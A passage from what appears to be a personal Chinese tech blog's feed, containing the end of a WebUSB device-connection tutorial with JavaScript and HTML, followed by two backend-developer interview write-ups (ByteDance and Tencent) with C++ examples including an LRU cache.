<span class="token function">connect</span><span class="token punctuation">(</span>selectedDevice<span class="token punctuation">)</span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>selectedDevice<span class="token punctuation">)</span><span class="token punctuation">;</span>            device <span class="token operator">=</span> selectedDevice<span class="token punctuation">;</span>            <span class="token function">genLog</span><span class="token punctuation">(</span><span class="token string">"Opening Device..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> device<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token function">genLog</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>device<span class="token punctuation">.</span>productName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>device<span class="token punctuation">.</span>manufacturerName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">) connected.`</span></span><span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>err <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token function">genLog</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>device <span class="token operator">&amp;&amp;</span> device<span class="token punctuation">.</span>opened<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    device<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token function">newConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> window<span class="token punctuation">.</span>USBWrapper<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>device <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>device<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">"No device selected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>device<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>device <span class="token operator">||</span> <span class="token operator">!</span>device<span class="token punctuation">.</span>opened<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">"Device not opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token function">genLog</span><span class="token punctuation">(</span><span class="token string">"Closing Device..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> device<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token function">genLog</span><span class="token punctuation">(</span><span class="token string">'Device closed.'</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span>Config <span class="token operator">=</span> Config<span class="token punctuation">;</span>    window<span class="token punctuation">.</span>genLog <span class="token operator">=</span> genLog<span class="token punctuation">;</span>    window<span class="token punctuation">.</span>clearLog <span class="token operator">=</span> clearLog<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="编写-html-页面并加载上面两个脚本"><a href="#编写-html-页面并加载上面两个脚本" class="headerlink" title="编写 html 页面并加载上面两个脚本"></a>编写 html 页面并加载上面两个脚本</h3><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>usb test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>js/usb.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>js/config.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">      window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"load"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token function">USBWrapperInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>USBWrapper<span class="token punctuation">.</span>hasUSB<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              navigator<span class="token punctuation">.</span>usb<span class="token punctuation">.</span><span class="token function">getDevices</span><span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>devices <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                  <span class="token keyword">if</span><span class="token punctuation">(</span>devices<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>                      config<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>devices<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span>              <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              navigator<span class="token punctuation">.</span>usb<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'connect'</span><span class="token punctuation">,</span> event <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                  config<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>device<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>log<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>connectBtn<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>config.newConnection()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>connect<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>disconnectBtn<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>config.close()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>disconnect<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>clearBtn<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>window.clearLog()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>clear log<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>实现以上的代码，就已经可以通过网页连接到 USB 设备了。可以打开 Chrome 的控制台查看连接后生成的 <code>USBDevice</code> 对象，里面有符合 USB 协议的各种信息。</p><p>接下来就是如何进行配置操作了。为了完成这一点，还需要设备端编写 USB 驱动程序并运行在设备的内核才行。怎么样传数据，就自己和设备端那边商量就行了。</p><p>对于这个 Web 应用，还需要做的就是给 Config 类添加各种配置的方法，其核心是调用</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> promise <span class="token operator">=</span> USBDevice<span class="token punctuation">.</span><span class="token function">transferIn</span><span class="token punctuation">(</span>endpointNumber<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token keyword">var</span> promise <span class="token operator">=</span> USBDevice<span class="token punctuation">.</span><span class="token function">transferOut</span><span class="token punctuation">(</span>endpointNumber<span class="token punctuation">,</span> data<span class="token punctuation">)</span></code></pre><p>这两个方法，进行 USB 的数据读取与写入操作。只要和设备端协商好了，接下来的就都好说了。</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>虽然我是在后台岗位实习，但是是着实干了很多前端的活啊。。。这两天也看了不少 HTML、CSS、Javascript、Typescript 的东西。。。感觉学到的都是一些奇奇怪怪的东西（针对于我想学更多后端的东西而言）。</p><p>对于 USB 协议与 Web 更深层次的东西我就不懂了，本项目也只是浅尝辄止。如果上面写的有什么错误或者可以提升的地方，您可以联系我（虽然我觉得应该不会有人看到我的博文），非常感谢。</p><h2 id="最后的最后"><a href="#最后的最后" class="headerlink" title="最后的最后"></a>最后的最后</h2><p>API 文档</p><ul><li><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/USB" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/API/USB</a></p></li><li><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/USBDevice" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/API/USBDevice</a></p></li><li><p>and more…</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javascript </tag>
            
            <tag> 学习 </tag>
            
            <tag> Web USB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4月9日字节跳动视频架构后台开发面经</title>
      <link href="/2020-4-9-bytedance-interview/"/>
      <url>/2020-4-9-bytedance-interview/</url>
      
        <content type="html"><![CDATA[<h1 id="4月9日字节跳动视频架构后台开发面经"><a href="#4月9日字节跳动视频架构后台开发面经" class="headerlink" title="4月9日字节跳动视频架构后台开发面经"></a>4月9日字节跳动视频架构后台开发面经</h1><h2 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h2><ul><li><p>项目经历</p><p>简单问了一下我大一下的的一个大作业车间调度算法的实现。</p></li><li><p>基础知识</p><ul><li><p>进程和线程的区别。</p></li><li><p>CPU 调度的最小单位是什么。</p></li><li><p>HTTP 与 HTTPS 的区别。</p></li><li><p>知道哪些数据库引擎。</p><p>​    我就只知道 InnoDB。。。</p></li><li><p>对称加密与非对称加密的区别。</p></li><li><p>数据库中 inner join 和 left join 的区别。</p></li><li><p>使用 select 语句分页查询的效率如何，比如查询前 100 个记录和后 100 个记录效率比较。</p></li><li><p>数据库事务的特点并解释。</p><p>​    即 ACID。（当时有点慌没有答好。。）</p></li><li><p>平衡二叉树和红黑树的定义。谁的查找效率更好？谁的插入效率更高？</p><p>​    平衡二叉树更好查找，因为它更矮更平均。红黑树的维护没有平衡二叉树那么复杂，所以插入效率更高。</p></li><li><p>ARP 协议的过程。</p></li><li><p>不同架构的机器（如 x86 和 arm）编译的可执行文件可以在对方机器上运行吗？为什么？要如何才能在不同架构的机器上执行？可以在一种架构的机器上编译另一种架构机器的可执行文件吗？如何做到？</p></li><li><p>Linux 会用吗？</p></li><li><p>Linux 如何查看文件权限。</p></li><li><p>操作系统进程调度的几种算法。</p></li></ul></li><li><p>算法</p><ul><li><p>单链表反转。（手写）</p></li><li><p>Top K 问题。</p><p>具体问法是 100w 个无序数据中选 100 个最大的数据。一开始我还在往位图算法上想。。。结果经面试官一提醒，直接建立一个容量为 100 的大根堆就行了。。</p></li></ul></li></ul><h2 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h2><ul><li><p>基础知识</p><ul><li><p>C++ <code>static</code> 关键字的作用。</p></li><li><p>C++ 中重载和重写分别是什么？</p></li><li><p>C++ 的动态绑定是怎样的？</p><p>​    一开始没理解面试官的意思，然后突然想起他应该指的是虚函数的动态绑定。</p></li><li><p>对 Python 多线程的理解。</p></li><li><p>对协程的看法。</p></li><li><p>知道哪些内存泄漏的例子。</p></li><li><p>TCP 与 UDP 的区别。</p></li><li><p>socket 编程中使用 TCP 连接的过程。</p></li><li><p>知道 RPC 吗？</p><p>​    这个只知道叫 远程过程调用，具体不清楚。。</p></li><li><p>小端模式与大端模式。</p></li></ul></li><li><p>算法</p><ul><li><p>最大子段和。（手写）</p></li><li><p>统计一个数二进制中 1 的个数。（手写）</p><p>有很多种方法，可参考 <a href="https://www.cnblogs.com/graphics/archive/2010/06/21/1752421.html" target="_blank" rel="noopener">https://www.cnblogs.com/graphics/archive/2010/06/21/1752421.html</a></p></li></ul></li><li><p>提问环节</p><p>问了下他们的业务。</p></li></ul><h2 id="三面"><a href="#三面" class="headerlink" title="三面"></a>三面</h2><p>​        三面只有十分钟，没有问什么技术问题。问了我对实习的看法，以后的规划。然后问我本科期间最后成就感的事情，然后给他看了下我的博客。基本上就是确认我会过去进行一段较长时间的实习。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​        首先要感谢<a href="https://ipotato.me" target="_blank" rel="noopener">耿总</a>的内推，不过耿总五月份就要去 aws 走上他的架构师之路了，这里要由衷地说一句<strong><font color="red">太强了</font></strong>。</p><p>​        头条的效率是真的高，一天下午就搞完三面。自己来说感觉还是比较充分的，不过还是有点小小的紧张，有很多问题都是张口就来，没有好好的思考，不过面试官都挺好的，我好几次都是经过面试官提醒才突然改答案，这么一想还有点尴尬。。。后来也渐渐进入状态。</p><p>​        我面试的小组目前做的是云游戏的内容（没想到头条也在搞云游戏），不过目前还只是起步阶段，后台开发主要是做云游戏的调度等工作，然和后其他视频平台比如抖音做对接。只能说是很巧了，我的的确确对云游戏很感兴趣，这里要再次感谢耿总的内推。二面的时候我还问了下面试官腾讯的云游戏（指堡垒之夜）没有办法进行语音，不知道这是为什么，是有技术上的问题吗，然后面试官：你来就知道了（笑）。</p>]]></content>
      
      
      <categories>
          
          <category> 面经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字节跳动面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4月1日腾讯 TEG 后台开发一轮面试凉经</title>
      <link href="/2020-4-1-tx-interview/"/>
      <url>/2020-4-1-tx-interview/</url>
      
        <content type="html"><![CDATA[<h1 id="4月1日腾讯-TEG-后台开发一轮面试凉经"><a href="#4月1日腾讯-TEG-后台开发一轮面试凉经" class="headerlink" title="4月1日腾讯 TEG 后台开发一轮面试凉经"></a>4月1日腾讯 TEG 后台开发一轮面试凉经</h1><h2 id="面试过程"><a href="#面试过程" class="headerlink" title="面试过程"></a>面试过程</h2><ul><li><p>一开始介绍自己写的几个项目（其实就是大作业）</p></li><li><p>基础知识</p><ul><li><p>TCP 的三次握手和四次挥手</p></li><li><p>DNS 的原理</p></li><li><p>C++ vector 的原理和实现</p></li><li><p>C++ 的多态</p><p>这里主要问的是虚函数的实现机制，也就是<strong>虚函数表 + 虚表指针</strong>，然后问了虚函数表是属于谁（类还是实例）。</p></li><li><p>C++ 构造函数为什么不能是虚函数</p><p>因为调用虚函数需要虚表指针，但是虚表指针需要对象实例化之后才分配内存。</p></li><li><p>然后问了一个代码的运行效果</p></li></ul><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Hello"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    A <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>    p<span class="token operator">-</span><span class="token operator">></span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>一开始我说会运行失败，因为 p 没有分配内存。然后面试官让我下来自己跑跑看。我还以为会有什么意想不到的结果，之后我自己跑了下看看发现发生了段错误 <code>segmentation fault</code>，那不是和我想的一样吗，可能我们都误解了对方的意思。。。</p></li><li><p>算法题</p><ul><li><p>LRU cache 的实现，要求时间复杂度为 O(1)</p><p>这是 LeetCode 上一道很经典的算法题。我一开始想用哈希表来做，也想过用优先队列，但是都没办法实现 <code>get()</code> 和 <code>set()</code> 都是 O(1)。然后最后也没有想出来。后来在网上查，方法是<strong>双向链表 + 哈希表</strong>（面试官还提示了我可能不止用一种数据结构 23333）。</p><p>LeetCode 上对这个问题的分析：</p><blockquote><p>哈希表查找快，但是数据无固定顺序；链表有顺序之分，插入删除快，但是查找慢。所以结合一下，形成一种新的数据结构：哈希链表。</p><p>来源：<a href="https://leetcode-cn.com/problems/lru-cache/solution/lru-ce-lue-xiang-jie-he-shi-xian-by-labuladong/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/lru-cache/solution/lru-ce-lue-xiang-jie-he-shi-xian-by-labuladong/</a></p></blockquote><p>现在用 C++ 实现一下。</p><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;list></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unordered_map></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">LRUCache</span> <span class="token punctuation">{</span><span class="token keyword">private</span><span class="token operator">:</span>    <span class="token comment" spellcheck="true">// 容量</span>    <span class="token keyword">int</span> capacity<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// STL 中的双向链表</span>    <span class="token comment" spellcheck="true">// 元素为 Key-Value 键值对</span>    list<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">></span> cache<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// STL 中的哈希表</span>    <span class="token comment" spellcheck="true">// Value 为双向链表上某一元素的位置，用迭代器保存</span>    unordered_map<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> list<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">></span><span class="token operator">::</span>iterator<span class="token operator">></span> map<span class="token punctuation">;</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token function">LRUCache</span><span class="token punctuation">(</span><span class="token keyword">int</span> c<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>capacity <span class="token operator">=</span> c<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">int</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">auto</span> it <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>it <span class="token operator">==</span> map<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span> kv <span class="token operator">=</span> <span class="token operator">*</span>map<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>        cache<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cache<span class="token punctuation">.</span><span class="token function">push_front</span><span class="token punctuation">(</span>kv<span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> cache<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> kv<span class="token punctuation">.</span>second<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">int</span> <span class="token function">put</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">auto</span> it <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>it <span class="token operator">==</span> map<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cache<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> capacity<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">auto</span> last <span class="token operator">=</span> cache<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> last_key <span class="token operator">=</span> last<span class="token punctuation">.</span>first<span class="token punctuation">;</span>                map<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>last_key<span class="token punctuation">)</span><span class="token punctuation">;</span>                cache<span class="token punctuation">.</span><span class="token function">pop_back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>             cache<span class="token punctuation">.</span><span class="token function">push_front</span><span class="token punctuation">(</span><span class="token function">make_pair</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            map<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> cache<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            cache<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cache<span class="token punctuation">.</span><span class="token function">push_front</span><span class="token punctuation">(</span><span class="token function">make_pair</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            map<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> cache<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><ul><li>判断字符串是否有重复字符（C++ 实现）</li></ul></li></ul><p>我用了 STL 里的 map 来实现。时间复杂度算上 map 的原理是 O(nlogn)，然后面试官就问我 map 的实现原理。我说可能是哈希表或者是二叉树，然后他告诉我 hash_map（C++ 标准库中叫 unordered_map） 才是哈希表，map 的原理是红黑树。</p></li><li><p>最后面试官介绍了下他们部门</p><p>腾讯的 TEG，很好的一个技术向的部门，可惜我去不了。。</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​        面试官挺好的，一直很有耐心的在听我描述，然后也一直在和我一起讨论问题，引导我做一些更多的尝试。面试的过程挺轻松，我一开始还挺紧张，后来就越来放下心来回答问题。最后也滔滔不绝地给我介绍了他们部门。结果最后给我来一个当头棒喝。。就是他们部门的后台开发只有深圳。。。。然后我说我去不了深圳，然后面试官确认了一下我不会去深圳，结束面试过后就把流程变灰了。。。。可谓是秒凉。。。</p><p>​        有一种努力全白费的感觉，就当是吸取面试经验了。。</p>]]></content>
      
      
      <categories>
          
          <category> 面经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 腾讯面试 </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里 3月25日 笔试第一题</title>
      <link href="/2020-3-25-ali/"/>
      <url>/2020-3-25-ali/</url>
      
